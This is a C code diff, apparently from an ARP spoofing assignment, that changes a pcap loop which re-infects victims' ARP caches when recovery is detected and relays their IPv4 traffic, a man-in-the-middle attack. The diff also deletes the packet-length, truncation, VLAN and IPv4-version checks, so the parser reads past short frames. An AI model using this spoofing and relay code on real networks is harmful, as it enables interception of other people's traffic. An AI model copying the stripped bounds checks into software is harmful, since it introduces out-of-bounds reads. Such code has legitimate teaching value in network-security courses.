@@ -144,7 +144,7 @@ size_t receiveandsend(pcap_t* pcap, ip_collection* collect, int pair_cnt, char *
     struct timespec t0, t1;
     clock_gettime(CLOCK_MONOTONIC, &t0);
     while (1) {
-        // 200ms 동작 후 반환(기존 정책 유지)
+        // 200ms 동작 후 반환
         clock_gettime(CLOCK_MONOTONIC, &t1);
         long elapsed_ms = (t1.tv_sec - t0.tv_sec) * 1000L + (t1.tv_nsec - t0.tv_nsec) / 1000000L;
         if (elapsed_ms >= RECVPKT_TIMEOUT_MS) break;
@@ -152,36 +152,23 @@ size_t receiveandsend(pcap_t* pcap, ip_collection* collect, int pair_cnt, char *
         int res = pcap_next_ex(pcap, &header, &pkt);
         if (res == 0) continue;
         if (res == -1 || res == -2) break;
-        if (header->caplen < 14) continue;
-        if (header->caplen != header->len) continue; // 절단 프레임은 버림
 
         // 이더넷 헤더
         const uint8_t* eth = pkt;
         uint16_t etype = ntohs(*(uint16_t*)(pkt + 12));
-        int l2off = 14;
-
-        // VLAN 태그 보정(0x8100, Q-in-Q도 일부 대응)
-        if (etype == 0x8100 || etype == 0x88A8) {
-            if (header->caplen < 18) continue;
-            etype = ntohs(*(uint16_t*)(pkt + 16));
-            l2off = 18;
-        }
-
         // ARP: 복구 징후 시 재감염 트리거
         if (etype == 0x0806) {
-            if (header->caplen < l2off + 28) continue;
-            const u_char* arp_ptr = pkt + l2off;
-
-            uint8_t sha[6];
-            uint32_t spa, tpa;
-            memcpy(sha, arp_ptr + 8, 6);
-            memcpy(&spa, arp_ptr + 14, 4);
-            memcpy(&tpa, arp_ptr + 24, 4);
+            const u_char* arp_ptr = pkt + 14;
+            uint8_t arp_send_mac[6];
+            uint32_t arp_send_ip, arp_target_ip;
+            memcpy(arp_send_mac, arp_ptr + 8, 6);
+            memcpy(&arp_send_ip, arp_ptr + 14, 4);
+            memcpy(&arp_target_ip, arp_ptr + 24, 4);
 
             for (int i=0; i<pair_cnt; i++) {
-                if ((spa == collect[i].sendip && tpa == collect[i].targetip) ||
-                    (spa == collect[i].targetip && tpa == collect[i].sendip)) {
-                    if (memcmp(sha, collect[i].mymac, 6) != 0) {
+                if ((arp_send_ip == collect[i].sendip && arp_target_ip == collect[i].targetip) ||
+                    (arp_send_ip == collect[i].targetip && arp_target_ip == collect[i].sendip)) {
+                    if (memcmp(arp_send_mac, collect[i].mymac, 6) != 0) {
                         infect(collect, pcap, pair_cnt, name);
                     }
                     break;
@@ -189,13 +176,10 @@ size_t receiveandsend(pcap_t* pcap, ip_collection* collect, int pair_cnt, char *
             }
             continue; // ARP는 릴레이하지 않음
         }
-
         // IPv4만 릴레이
         if (etype != 0x0800) continue;
-        if (header->caplen < l2off + 20) continue;
-        const u_char* ip_ptr = pkt + l2off;
-        if ((ip_ptr[0] >> 4) != 4) continue;
 
+        const u_char* ip_ptr = pkt + 14;
         // 목적지 MAC이 내 MAC인 프레임만 처리, 내가 보낸 건 제외
         if (memcmp(eth + 0, collect[0].mymac, 6) != 0) continue;
         if (memcmp(eth + 6, collect[0].mymac, 6) == 0) continue;
@@ -206,6 +190,7 @@ size_t receiveandsend(pcap_t* pcap, ip_collection* collect, int pair_cnt, char *
 
         const uint8_t* src_mac = eth + 6; // 이더넷 Source MAC
 
+        //frame 변수를 선언할 때 자꾸 오류가 나길래 AI를 활용하여서 선언하였습니다.
         for (int i = 0; i < pair_cnt; i++) {
             // sender -> target
             if (memcmp(src_mac, collect[i].sendmac, 6) == 0) {
